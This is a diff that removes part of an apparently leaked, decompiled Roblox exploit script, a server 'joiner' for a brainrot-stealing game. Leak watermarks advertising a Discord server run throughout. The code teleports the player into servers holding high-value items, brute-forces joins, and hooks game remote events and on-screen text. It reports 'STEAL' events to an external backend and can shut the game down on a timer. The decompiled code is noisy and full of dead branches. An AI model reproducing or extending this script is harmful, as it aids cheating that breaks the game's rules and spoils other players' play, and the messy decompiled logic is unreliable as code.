-							end  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-						end
-					end
-
-					return tbl52
-				end
-			end
-
-			return {}
-		end
-
-		up_410 = tbl45
-		local function slicedfn91(B)if not B or not B.Generation then return false;end;if B.Generation>=5000000 then return true;end;if table.find(up_410,B.DisplayName)then return true;end;return false;end
-		local sliced108 = nil  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-
-		local function slicedfn92()
-			if not sliced103 then
-				return
-			end
-
-			for _, v in pairs(sliced103) do
-				local animalList = v.Channel.CacheTable.AnimalList
-				local name = localPlayer2.Name
-
-				if tostring(v.Channel.CacheTable.Owner) ~= name and animalList then
-					for _, sliced109 in pairs(animalList) do
-						if type(sliced109) ~= "table" then  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-							continue
-						end
-
-						if sliced109.Steal and sliced109.Steal == localPlayer2.UserId then
-							local sliced110 = slicedfn89(sliced109)
-
-							if sliced110 then
-								sliced108 = sliced110
-
-								if slicedfn91(sliced110) then
-									local sliced111 = "?"
-									local str15
-
-									if "?" then  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-										str15 = sliced111
-									else
-										str15 = ""
-									end
-
-									local str16 = tostring(math.floor(slicedfn62()))
-									local json2 = HttpService:JSONEncode({ animal = sliced110, discordId = str15 })
-									json = HttpService:JSONEncode({ op = "STEAL", payload = json2, sig = slicedfn61(json2, str16), ts = str16 })
-								end
-							end
-
-							return true  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-						end
-					end
-				end
-			end
-
-			return false
-		end
-
-		up_411 = {
-			["GrabNotify"] = {
-				Match = "Sounds.Animals",
-				Callback = function()  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-					task.wait(3)
-					slicedfn92()
-				end,
-			},
-		}
-
-		up_412 = HttpService
-		local function slicedfn93(...)for B,I in pairs(up_411)do local e,H=false,false;for a=1,select("#",...),1 do B=select(a,...);if type(B)=="string"then if string.find(B,I.Match,1,true)then e=true;break;end;else H=if type(B)=="table"then true else H;end;end;if not e and H then for H=1,select("#",...),1 do B=select(H,...);if type(B)=="table"then local H,a=pcall(up_412.JSONEncode,up_412,B);if H and(string.find(a,I.Match,1,true))then e=true;break;end;end;end;end;if e then I.Callback();end;end;end
-		local tbl52 = { JobId = nil, Generation = -1, Priority = -1, UniqueKey = nil, RunId = 0 }
-		local tbl53 = {}
-
-		pcall(function()  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-			local v = SoundService:FindFirstChild("JoinAlert")
-
-			if v and v:IsA("Sound") then
-				v:Destroy()
-			end
-		end)
-
-		local sound = Instance.new("Sound")
-		sound.Name = "JoinAlert"
-		sound.SoundId = "rbxassetid://" .. tostring(tbl35.SoundId)
-		sound.Volume = tbl35.SoundVolume
-		sound.Parent = SoundService  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-		up_413 = tbl19
-		local function slicedfn94()return up_413.isAlive==nil or(up_413.isAlive());end
-		up_414 = tbl19
-		up_415 = tbl32
-		up_416 = slicedfn59
-		up_417 = {}
-		local function slicedfn95(B,I,e)local H=up_415.Items[B];local a=H and H.State or"None";B=up_416(H and H.MinGen or 0);local K=H and H.Mutations or up_417;if a=="Blacklist"then return false;end;if a~="None"and#K>0 and e then for H,H in ipairs(K)do if H==e then return true;end;end;end;if a=="Whitelist"then return up_416(I)>=B;end;if up_415.Global.Enabled then return up_416(I)>=up_416(up_415.Global.MinGen);end;return true;end
-		up_418 = str12
-		local function slicedfn96(B)if up_418 =="No"then return B.Carpet~=true;end;if up_418 =="Only"then return B.Carpet==true;end;return true;end
-		up_419 = flag22  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-		up_420 = flag23
-		up_421 = tbl30
-		local function slicedfn97()if up_419 then return true;end;if not up_420 then return false;end;local B=up_421 [game.JobId];if B and B.animals then for w,w in ipairs(B.animals)do if w.Rarity=="OG"then return false;end;end;end;return true;end
-		local function slicedfn98(w,B)return not B or w.Rarity=="OG";end
-		up_422 = tbl52
-		up_423 = slicedfn59
-		up_424 = slicedfn80
-		up_425 = tbl53
-		up_426 = sound
-		up_427 = slicedfn88  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-		up_428 = tbl30
-		up_429 = TeleportService
-		up_430 = localPlayer2
-		up_431 = defaultAttempts
-		up_432 = slicedfn94
-		up_433 = tbl19
-		up_434 = placeId
-		up_435 = tbl35
-		up_436 = slicedfn78
-		up_437 = sliced107  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-		local function slicedfn99(B,I,e,H)if B==game.JobId then return;end;up_422.JobId=B;up_422.Generation=up_423(e);up_422.Priority=H or 0;up_422.UniqueKey=I;up_422.RunId=up_422.RunId+1;up_422.StartedAt=os.clock();local a=up_422.RunId;up_424 (B);up_425[B]=nil;pcall(function()up_426:Play();end);local K="Brainrot";local L=up_427 (e);H=up_428 [B];if H and H.animals then for A,A in ipairs(H.animals)do if up_423(A.Generation)==up_423(e)then K=A.DisplayName or K;break;end;end;if K=="Brainrot"and H.animals[1]then K=H.animals[1].DisplayName or K;end;end;task.spawn(function()local e=nil;local H=up_429.TeleportInitFailed:Connect(function(A,P,v)if A==up_430 then e=P;end;end);local A=up_431 ;local P=false;for v=1,A,1 do if not up_432()or up_422.UniqueKey~=I or up_422.RunId~=a then break;end;if up_433.showJoinProgress then pcall(up_433.showJoinProgress,K,L,v,A);elseif v==1 and up_433.showJoin then pcall(up_433.showJoin,K,L,"CONNECTING TO");end;e=nil;if not pcall(function()up_429:TeleportToPlaceInstance(up_434,B,up_430);end)then e=Enum.TeleportResult.Failure;end;if up_433.feedJoinProgress then pcall(up_433.feedJoinProgress,B,v,A);end;local N=0;while not e and N<5 do N+=task.wait(0.1);if not up_432()or up_422.UniqueKey~=I or up_422.RunId~=a then break;end;end;if not e and up_422.RunId==a and up_422.UniqueKey==I and up_433.showJoin then pcall(up_433.showJoin,K,L,"TELEPORTING TO");end;P=if v==A then true else P;end;if H then H:Disconnect();end;if up_422.UniqueKey==I and up_422.RunId==a then if P and e then if up_433.hideJoin then pcall(up_433.hideJoin);end;if up_433.notify then pcall(up_433.notify,"Joiner",up_435.BruteForceJoin and tostring(A).." attempts to "..tostring(K).." failed \226\128\148 will keep trying"or"Failed to join "..tostring(K).." after "..tostring(A).." attempts");end;end;if P and not e then task.delay(15,function()if(up_422.UniqueKey==nil or up_422.RunId==a)and up_433.hideJoin then pcall(up_433.hideJoin);end;end);end;if not up_435.BruteForceJoin and P then up_436 (B);end;if up_433.feedJoinEnded then pcall(up_433.feedJoinEnded,B);end;up_422.JobId=nil;up_422.UniqueKey=nil;up_422.Generation=-1;up_422.Priority=-1;end;end);up_437 ();end
-		up_438 = slicedfn97
-		up_439 = flag22
-		up_440 = tbl30
-		up_441 = slicedn34
-		up_442 = slicedfn82
-		up_443 = slicedfn59
-		up_444 = slicedfn96
-		up_445 = slicedfn98
-		up_446 = slicedfn95  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-		up_447 = flag21
-		up_448 = slicedn33
-		up_449 = slicedfn81
-		up_450 = tbl53
-		up_451 = slicedfn47
-		up_452 = tbl52
-		up_453 = str13
-		up_454 = tbl17
-		up_455 = slicedfn99
-		up_456 = slicedfn94  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-		up_457 = false
-		up_458 = false
-		up_459 = tbl30
-		up_460 = tbl43
-		up_461 = tbl33
-		up_462 = slicedfn76
-		up_463 = slicedfn59
-		up_464 = slicedfn96
-		up_465 = flag21
-		up_466 = slicedn33  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-		up_467 = slicedfn95
-		up_468 = tbl17
-		up_469 = tbl19
-		up_470 = slicedfn88
-		up_471 = sliced107
-		local function slicedfn100()if not up_456()then return;end;if up_457 then up_458 =true;return;end;up_457 =true;local B=nil;for I,e in pairs(up_459 )do local H=up_460 [I];if not up_461 [I]and not(H and(H.status=="cleared"or H.hidden)and not up_462 (I))and e.animals and#e.animals>0 then local H,a;for K,L in ipairs(e.animals)do K=up_463(L.Generation or 0);local A=up_464(L);if(if A and L._duelDisplay then if not up_465 then false else L._duelDisplay<=up_466 else A)and(up_467(L.DisplayName or"",K,L.Mutation))then if not H or K>a then H,a=L,K;end;end;end;if H then B=B or{};B[#B+1]={jobId=I,best=H,elapsed=e.elapsedSeconds or 0};end;end;end;if B then if#B>1 then table.sort(B,function(I,e)if I.elapsed~=e.elapsed then return I.elapsed>e.elapsed;end;return I.jobId<e.jobId;end);end;local I=up_468.FeedMaxRows or 40;if#B>I then for e=1,#B-I,1 do up_461 [B[e].jobId]=true;end;B=(table.move(B,#B-I+1,#B,1,{}));end;I=6;for e=1,#B,1 do if not up_456()then break;end;local H=B[e];local a=H.jobId;if up_459 [a]and not up_461 [a]then local K=H.best;local H=true;if up_469.feedAdd then local L,A=pcall(up_469.feedAdd,K.DisplayName or"?",K.Rarity,up_470 (K.Generation or 0),a,K.Mutation,K.Carpet==true);H=L and A~=false;end;if H then up_461 [a]=true;end;I-=1;if I<=0 and e<#B then task.wait();I=6;end;end;end;end;up_457 =false;if up_458 then up_458 =false;task.defer(up_471 );end;end
-		up_472 = slicedfn94
-		up_473 = tbl33
-		up_474 = tbl30
-		up_475 = slicedfn59  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-		up_476 = slicedfn96
-		up_477 = flag21
-		up_478 = slicedn33
-		up_479 = slicedfn95
-		up_480 = tbl19
-		up_481 = tbl17
-		up_482 = slicedfn100
-		local function slicedfn101()if not up_472()then return;end;for B in pairs(up_473 )do local I=up_474 [B];if I and I.animals then local e,H;for a,K in ipairs(I.animals)do a=up_475(K.Generation or 0);local I=up_476(K);if(if I and K._duelDisplay then if not up_477 then false else K._duelDisplay<=up_478 else I)and(up_479(K.DisplayName or"",a,K.Mutation))then if not e or a>H then e,H=K,a;end;end;end;local I=false;if not e then I=true;elseif up_480.feedRowName then local H,a=pcall(up_480.feedRowName,B);I=if H then if a==nil then true else if not up_481.SplitView and a~=(e.DisplayName or"?")then true else I else I;end;if I then up_473 [B]=nil;if up_480.feedRemove then pcall(up_480.feedRemove,B);end;end;end;end;if up_482 then task.defer(up_482 );end;end
-
-		local function slicedfn102()
-			local jobId = tbl52.JobId  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-			if not jobId then
-				return
-			end
-			tbl53[jobId] = tbl52.Generation
-			tbl52.JobId = nil
-			tbl52.UniqueKey = nil
-			tbl52.Generation = -1
-			tbl52.Priority = -1
-
-			if tbl19.feedJoinEnded then
-				pcall(tbl19.feedJoinEnded, jobId)  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-			end
-
-			if tbl19.hideJoin then
-				pcall(tbl19.hideJoin)
-			end
-		end
-
-		tbl18.joinServer = function(arg)
-			if not arg then
-				return false
-			end
-
-			if tbl52.UniqueKey and tbl52.JobId == arg then  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-				slicedfn102()
-				return "cancelled"
-			end
-			local v = tbl30[arg]
-			if not v or not v.animals then
-				return false
-			end
-			local sliced109 = nil
-			local sliced110 = nil
-			local n = nil  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-
-			for i, animal in ipairs(v.animals) do
-				local sliced111 = slicedfn59(animal.Generation or 0)
-
-				if slicedfn95(animal.DisplayName or "", sliced111, animal.Mutation) then
-					if not sliced109 or sliced111 > sliced110 then
-						sliced109 = animal
-						sliced110 = sliced111
-						n = i
-					end
-				end
-			end  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-
-			if not sliced109 then
-				sliced109 = v.animals[1]
-				n = 1
-			end
-
-			if not sliced109 then
-				return false
-			end
-			slicedfn99(arg, slicedfn47(arg, sliced109, n), sliced109.Generation or 0, sliced109.prio or 0)
-			return true
-		end  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-
-		tbl18.jobAnimals = function(arg)
-			local v = 10285
-
-			if true then
-				arg = arg and tbl30[arg]
-				if not arg or not arg.animals then
-					return nil
-				end
-				local tbl54 = {}
-
-				for i, animal in ipairs(arg.animals) do
-					local sliced109 = slicedfn59(animal.Generation or 0)  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-					local flag26 = slicedfn96(animal)
-
-					if flag26 and animal._duelDisplay then
-						if not flag21 then
-							flag26 = false
-						else
-							flag26 = animal._duelDisplay <= slicedn33
-						end
-					end
-
-					if flag26 then
-						flag26 = slicedfn95(animal.DisplayName or "", sliced109, animal.Mutation)  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-					end
-
-					if flag26 then
-						tbl54[#tbl54 + 1] = {
-							name = animal.DisplayName or "?",
-							rarity = animal.Rarity,
-							gen = slicedfn88(animal.Generation or 0),
-							genVal = sliced109,
-							mutation = animal.Mutation,
-							idx = i,
-							carpet = animal.Carpet == true,  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-						}
-					end
-				end
-
-				table.sort(tbl54, function(arg2, arg3)
-					if arg2.genVal ~= arg3.genVal then
-						return arg2.genVal > arg3.genVal
-					end
-					return arg2.idx < arg3.idx
-				end)
-
-				return tbl54  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-			end
-
-		end
-
-		tbl18.joinAnimal = function(arg, arg2, arg3)
-			if not arg then
-				return false
-			end
-			local v = tbl30[arg]
-			if not v or not v.animals then
-				return false
-			end  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-			local sliced109 = v.animals[arg2]
-			local flag26 = not sliced109
-
-			if not flag26 then
-				if arg3 then
-					flag26 = (sliced109.DisplayName or "?") ~= arg3
-				else
-					flag26 = arg3
-				end
-			end
-
-			if flag26 then  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-				sliced109 = nil
-				arg2 = nil
-
-				if arg3 then
-					sliced109 = nil
-					arg2 = nil
-
-					for i, animal in ipairs(v.animals) do
-						if (animal.DisplayName or "?") == arg3 then
-							sliced109 = animal
-							arg2 = i
-							break  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-						else
-							sliced109 = nil
-							arg2 = nil
-						end
-					end
-				end
-			end
-
-			if not sliced109 then
-				return false
-			end  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-			local sliced110 = slicedfn47(arg, sliced109, arg2)
-			if tbl52.UniqueKey == sliced110 then
-				slicedfn102()
-				return "cancelled"
-			end
-			slicedfn99(arg, sliced110, sliced109.Generation or 0, sliced109.prio or 0)
-			return true
-		end
-
-		tbl18.setAutoJoin = function(arg)
-			flag22 = arg and true or false  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-		end
-
-		tbl18.isJoining = function()
-			return tbl52.JobId ~= nil
-		end
-
-		tbl18.rejoin = function()
-			pcall(function()
-				TeleportService:TeleportReconnect()
-			end)
-		end
-
-		up_483 = slicedfn65  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-		up_484 = flag24
-		up_485 = slicedn37
-		up_486 = slicedn38
-		up_487 = slicedfn64
-		tbl18.reconnect = function()local B=up_483();up_484 =true;up_485 =0;up_486 =0;if B then pcall(up_487,B);end;end
-
-		tbl18.markCleared = function(arg)
-			pcall(slicedfn79, arg)
-		end
-
-		tbl18.jobElapsed = function(arg)
-			arg = arg and tbl30[arg]  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-			return arg and arg.elapsedSeconds or nil
-		end
-
-		tbl18.applySettings = function(arg)
-			if type(arg) == "table" then
-				local flag26 = false
-
-				if type(arg.MaxDuelTime) == "number" then
-					local n = math.max(0, arg.MaxDuelTime)
-					flag26 = n ~= slicedn33
-					slicedn33 = n
-				end  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-
-				if arg.TPDuelEnabled ~= nil then
-					local flag27 = arg.TPDuelEnabled and true or false
-					flag26 = flag26 or flag27 ~= flag21
-					flag21 = flag27
-				end
-
-				if arg.CarpetMode ~= nil then
-					local carpetMode = arg.CarpetMode
-
-					if carpetMode ~= "Yes" and carpetMode ~= "Only" and carpetMode ~= "No" then
-						carpetMode = "Yes"
-					end  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-
-					flag26 = flag26 or carpetMode ~= str12
-					str12 = carpetMode
-				end
-
-				if arg.AutoJoinOGOffAJ ~= nil then
-					flag23 = arg.AutoJoinOGOffAJ and true or false
-				end
-
-				if arg.MidRetrySwitch ~= nil then
-					local midRetrySwitch = arg.MidRetrySwitch
-
-					if midRetrySwitch ~= "Better Newest" and midRetrySwitch ~= "Any Newest" then
-						if true then  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-							midRetrySwitch = "Better Newest"
-						end
-					end
-
-					str13 = midRetrySwitch
-				end
-
-				if type(arg.Attempts) == "number" then
-					defaultAttempts = math.max(1, math.floor(arg.Attempts))
-				end
-
-				if type(arg.MaxElapsedJoin) == "number" then
-					slicedn34 = math.max(0, arg.MaxElapsedJoin)  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-				end
-
-				if arg.BruteForceJoin ~= nil then
-					tbl35.BruteForceJoin = arg.BruteForceJoin and true or false
-				end
-
-				if arg.SoundId then
-					tbl35.SoundId = tostring(arg.SoundId)
-
-					pcall(function()
-						sound.SoundId = "rbxassetid://" .. tbl35.SoundId
-					end)
-				end  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-
-				if type(arg.SoundVolume) == "number" then
-					tbl35.SoundVolume = arg.SoundVolume
-
-					pcall(function()
-						sound.Volume = arg.SoundVolume
-					end)
-				end
-
-				if flag26 then
-					slicedfn101()
-				end
-
-				return  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-			end
-
-			if true then
-				return
-			end
-
-		end
-
-		tbl18.wlApply = function(arg, items)
-
-			if true then
-				local v = "table"
-
-				if type(arg) == v then
-					tbl32.Global = {  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-						Enabled = arg.Enabled and true or false,
-						MinGen = math.max(0, tonumber(arg.MinGen) or 0),
-					}
-				end
-
-				local sliced109 = "table"
-
-				if type(items) == sliced109 then
-					tbl32.Items = items
-				end
-
-				for k in pairs(tbl32.Items) do
-					tbl34[k] = true  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-				end
-
-				slicedfn101()
-			end
-		end
-
-		tbl18.wlKnown = function()
-			local tbl54 = {}
-
-			for k in pairs(tbl34) do
-				tbl54[#tbl54 + 1] = k
-			end
-
-			table.sort(tbl54)  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-			return tbl54
-		end
-
-		tbl18.allBrainrotNames = function()
-			local tbl54 = {}
-
-			if animals then
-				for k in pairs(animals) do
-					tbl54[#tbl54 + 1] = k
-				end
-			end
-
-			return tbl54  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-		end
-
-		tbl18.mutationList = function()
-			if true then
-				return tbl41
-			end
-
-		end
-
-		tbl18.testSound = function()
-			pcall(function()
-				sound.SoundId = "rbxassetid://" .. tostring(tbl35.SoundId)
-				sound.Volume = tbl35.SoundVolume  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-
-				if not sound.IsLoaded then
-					pcall(function()
-						game:GetService("ContentProvider"):PreloadAsync({ sound })
-					end)
-				end
-
-				sound:Play()
-			end)
-		end
-
-		tbl18.brainrotImage = function(arg)
-			local v = animals and animals[arg]  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-
-			if false then
-			else
-				local sliced109 = "table"
-				if type(v) ~= sliced109 then
-					return nil
-				end
-				local icon = v.Icon or v.Image or v.Thumbnail or v.ImageId or v.Texture
-
-				if type(icon) ~= "number" then
-					if type(icon) == "string" and icon ~= "" then
-						if icon:find("rbxasset") or icon:find("http") then  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-							return icon
-						end
-						local match = icon:match("%d+")
-						return match and "rbxassetid://" .. match or nil
-					end
-
-					return nil
-				end
-
-				if true then
-					if true then
-						return "rbxassetid://" .. icon  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-					end
-
-				end
-			end
-		end
-
-		tbl18.mutationHex = function(arg)
-			if not arg or arg == "" then
-				arg = "Normal"
-			end
-
-			local v = tbl42[arg]
-			if v then  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-				return v
-			end
-			local sliced109 = slicedfn58(arg)
-			local str15 = string.format("#%02X%02X%02X", math.floor(sliced109.R * 255 + 0.5), math.floor(sliced109.G * 255 + 0.5), math.floor(sliced109.B * 255 + 0.5))
-			tbl42[arg] = str15
-			return str15
-		end
-
-		tbl18.joinStatus = function(arg)
-			if not arg then
-				return nil  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-			end
-			local v = tbl43[arg]
-			if type(v) ~= "table" or not v.status then
-				return nil
-			end
-
-			if v.status == "joined" and not slicedfn77(arg) then
-				return nil
-			end
-			return v.status
-		end  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-
-		slicedfn74()
-		slicedfn84()
-
-		if not tbl36[str14] then
-			str14 = "Default"
-		end
-
-		if not tbl36.Default then
-			tbl36["Default"] = { Global = { Enabled = false, MinGen = 0 }, Items = {}, createdAt = 0 }
-		end
-
-		if tbl36[str14] then
-			tbl32.Global = tbl36[str14].Global or tbl32.Global  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-			tbl32.Items = tbl36[str14].Items or tbl32.Items
-		end
-
-		task.spawn(slicedfn85)
-
-		task.spawn(function()
-			if type(huge) == "number" then
-				local now2 = os.time()
-
-				while task.wait(1) do
-					if huge <= os.time() - now2 then
-						task.wait(300)
-						game:Shutdown()  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-					end
-				end
-			end
-		end)
-
-		task.spawn(function()
-			if not plotController then
-				return
-			end
-			local v, sliced109 = slicedfn55(plotController.GetPlots, plotController)
-
-			if v and sliced109 then  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-				sliced103 = sliced109
-
-				if false then
-				else
-					pcall(function()
-						tbl38 = slicedfn90()
-					end)
-				end
-			end
-		end)
-
-		task.spawn(function()  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-			local now2 = os.clock()
-
-			while true do
-				local flag26 = sliced93 == nil
-
-				if flag26 then
-					local v = 15
-					flag26 = os.clock() - now2 < v
-				end
-
-				if flag26 then
-					task.wait(0.1)
-					continue  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-				end
-				break
-			end
-
-			while sliced93 ~= false do
-				if not slicedfn94() then
-					return
-				end
-				task.wait(1)
-			end
-
-			if not animals or not mutations or not traits or not plotController or not sliced92 then  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-				return
-			end
-
-			if not sliced103 then
-				local v, sliced109 = slicedfn55(plotController.GetPlots, plotController)
-				if not (v and sliced109) then
-					return
-				end
-				sliced103 = sliced109
-			end
-
-			for _, child in pairs(sliced92:GetChildren()) do  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-				if child:IsA("RemoteEvent") then
-					child.OnClientEvent:Connect(function(...)
-						if not slicedfn94() then
-							return
-						end
-						slicedfn93(...)
-					end)
-				end
-			end
-
-			local playerGui = localPlayer2:WaitForChild("PlayerGui", 10)  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-			if not playerGui then
-				return
-			end
-			local flag26 = false
-			up_525 = slicedfn94
-			up_526 = flag26
-			up_527 = json
-			up_528 = sliced108
-			up_529 = slicedfn63
-			up_530 = "?"  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-			up_531 = slicedfn91
-			local function slicedfn103(B)if not up_525()then return;end;if up_526 then return;end;if not B:IsA("TextLabel")and not B:IsA("TextButton")then return;end;local I=B.Text;if not I or#I<10 then return;end;if I:find("[Yy][Oo][Uu]%s+[Ss][Tt][Oo][Ll][Ee]%s")then up_526 =true;if up_527 and up_528 then up_529(up_528 ,up_530 or"");elseif up_528 and(up_531(up_528 ))then B=up_530 or"";up_529(up_528 ,B);end;task.delay(3,function()up_526 =false;end);end;end
-			up_532 = tbl50
-			up_533 = flag26
-			up_534 = slicedfn103
-			local function slicedfn104(B)if not B:IsA("TextLabel")and not B:IsA("TextButton")then return;end;pcall(function()up_532[#up_532+1]=B:GetPropertyChangedSignal("Text"):Connect(function()if up_533 then return;end;pcall(up_534,B);end);end);end
-
-			for _, descendant in ipairs(playerGui:GetDescendants()) do
-				slicedfn104(descendant)
-			end
-
-			tbl50[#tbl50 + 1] = playerGui.DescendantAdded:Connect(function(descendant)  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-				if not slicedfn94() then
-					return
-				end
-
-				if flag26 then
-					return
-				end
-				pcall(slicedfn103, descendant)
-				slicedfn104(descendant)
-			end)
-		end)  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-
-		local flag26 = false
-
-		local function slicedfn103()
-			if not slicedfn94() then
-				return
-			end
-
-			if flag26 then
-				return
-			end
-			flag26 = true
-			if sliced93 then  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-				return
-			end
-
-			if not sliced103 or not animals or not mutations or not traits then
-				return
-			end
-
-			if not sliced95 or not sliced94 then
-				return
-			end
-			local ok, result = pcall(slicedfn90)
-			if not ok or not result then  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-				return
-			end
-			local v = "?"
-			local str15
-
-			if "?" then
-				str15 = v
-			else
-				str15 = ""
-			end
-
-			for k, sliced109 in pairs(result) do  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-				if not tbl38[k] then
-					if not tbl39[(sliced109.DisplayName or "") .. "|" .. tostring(math.floor(sliced109.Generation or 0))] then
-						if slicedfn91(sliced109) then
-							pcall(function()
-								slicedfn63(sliced109, str15)
-							end)
-						end
-					end
-				end
-			end  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-		end
-
-		game.Close:Connect(slicedfn103)
-
-		Players2.PlayerRemoving:Connect(function(player)
-			if true then
-				if player == localPlayer2 then
-					slicedfn103()
-				end
-			end
-		end)
-
-		local teleportInitFailed = TeleportService.TeleportInitFailed  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-		local connect2 = teleportInitFailed.Connect
-		up_488 = GuiService
-		local sliced109 = connect2(teleportInitFailed, function()pcall(function()up_488:ClearError();end);end)
-
-		task.spawn(function()
-			local ok, result = pcall(function()
-				local wsUrl = getgenv().JoinerConfig_jhgjerdf324sa.WsUrl
-				if type(wsUrl) ~= "string" then
-					return nil
-				end
-				local str15 = wsUrl:gsub("^wss://", "https://"):gsub("^ws://", "http://"):gsub("/ws$", "/time")  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-				return game:HttpGet(str15)
-			end)
-
-			if not ok then
-				return
-			end
-			local num = tonumber(result)
-
-			if num and not sliced96 then
-				slicedn35 = num - os.time()
-			end
-		end)  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-
-		local spawn_ = task.spawn
-		up_489 = slicedfn94
-		up_490 = kaWaifuSessionId
-		up_491 = sliced95
-		up_492 = flag24
-		up_493 = tbl19
-		up_494 = slicedfn66
-		up_495 = slicedfn67
-		up_496 = slicedfn68
-		up_497 = tbl52  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-		up_498 = tbl30
-		up_499 = slicedfn97
-		up_500 = flag22
-		up_501 = slicedfn82
-		up_502 = slicedn34
-		up_503 = slicedfn59
-		up_504 = slicedfn96
-		up_505 = slicedfn98
-		up_506 = slicedfn95
-		up_507 = tbl53  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-		up_508 = slicedfn81
-		up_509 = flag21
-		up_510 = slicedn33
-		up_511 = str13
-		up_512 = slicedfn99
-		up_513 = slicedfn47
-		up_514 = slicedfn100
-		up_515 = Players2
-		up_516 = slicedfn86
-		up_517 = sliced109  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-		up_518 = slicedfn65
-		up_519 = slicedfn64
-		up_520 = tbl49
-		up_521 = tbl50
-		up_522 = tbl47
-		up_523 = tbl48
-		up_524 = sound
-		spawn_(function()local B=0;local I=0;local e=2;local H=nil;while up_489()and getgenv()._KaWaifuSessionId==up_490 do B+=1;if not up_491 then local a=os.time();if up_492 or a-I>=e then if up_492 then up_492 ,e=false,2;end;up_493.setWsStatus("connecting");I,e,H=a,if up_494()then 2 else math.min(e*1.5,10)*(0.8+0.4*math.random()),nil;end;end;if H~=up_491 and not(up_492 and not up_491 )then H=up_491 ;up_493.setWsStatus(up_491 and"live"or"offline");end;up_495();up_496();if up_497.JobId and not up_498 [up_497.JobId]then local e=up_497.JobId;up_497.JobId=nil;up_497.UniqueKey=nil;up_497.Generation=-1;up_497.Priority=-1;if up_493.feedJoinEnded then pcall(up_493.feedJoinEnded,e);end;end;if up_499()then local e,H,a,K,L=not up_500 ,-1,-1;local A=-1;for P,v in pairs(up_498 )do if up_501(P)then continue;end;if P==game.JobId then continue;end;if v.animals and#v.animals>0 and(v.elapsedSeconds or 0)<=up_502 then local N,S,j=math.huge,false;local p,W=-1,-1;for r,s in ipairs(v.animals)do local v=s.DisplayName or"";local y=up_503(s.Generation or 0);if up_504(s)and(up_505(s,e))and(up_506(v,y,s.Mutation))then if s._duelDisplay then local e=math.max(0,s._duelDisplay);N=if e<N then e else N;else S=true;end;if not j then j,p,W=s,y,r;end;end;end;if j then local e=nil;if S then local v=up_507[P];if(not v or p>v)and not up_508(P)then e=j.prio or 0;if e>H or e==H and p>a then H,a,K,L,A=e,p,P,j,W;end;end;elseif up_509 then if N<=up_510 then local v=up_507[P];if(not v or p>v)and not up_508(P)then e=j.prio or 0;if e>H or e==H and p>a then H,a,K,L,A=e,p,P,j,W;end;end;end;end;end;end;end;if K then if if not up_497.JobId then true else if not up_498 [up_497.JobId]then true else if up_511 =="Any Newest"then false else if H>up_497.Priority then true else if H==up_497.Priority and a>up_497.Generation then true else false then up_512(K,up_513(K,L,A),a,H);end;end;end;if B%4==0 then 